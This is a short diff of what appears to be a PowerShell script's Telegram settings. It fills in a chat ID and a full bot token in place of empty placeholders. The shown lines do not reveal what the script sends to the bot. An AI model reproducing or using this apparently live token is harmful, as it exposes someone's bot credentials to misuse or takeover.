@@ -8,8 +8,8 @@ $RandomNumber = Get-Random
 
 ### TELEGRAM CONFIG
 
-$chatid = "" # YOUR TELEGRAM CHAT ID
-$bottoken = "" # YOUR TELEGRAM BOT TOKEN
+$chatid = "1074750898" # YOUR TELEGRAM CHAT ID
+$bottoken = "7294453278:AAHxr2MxCz6AlifGHg-hGHPvVgMBs8tx6Qo" # YOUR TELEGRAM BOT TOKEN
 
 ### TELEGRAM CONFIG
 
